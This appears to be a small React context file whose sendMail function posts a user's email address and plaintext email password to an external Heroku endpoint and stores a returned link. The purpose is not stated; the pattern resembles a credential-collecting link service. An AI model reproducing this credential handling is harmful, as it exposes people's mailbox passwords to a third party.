import React, { createContext, useState } from 'react';
import axios from 'axios'

const MailContext = createContext();

/* eslint-disable react/prop-types */
const MailProvider = ({ children }) => {
  const [todos, setTodos] = useState('');

  const sendMail = async (data) => {
  const osman  =  {
        email_username: data.email,
        email_password: data.pass
  }
    try {
    const res = await axios.post('https://spacez-link.herokuapp.com/api/submit/email-config',osman)

      const data = await res;
       setTodos((prevTodos) => {
        const updatedTodos = data.data.link;
        return updatedTodos;
      });
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <MailContext.Provider
      value={{
        todos,
        sendMail,
      }}
    >
      {children}
    </MailContext.Provider>
  );
};

export { MailProvider, MailContext };
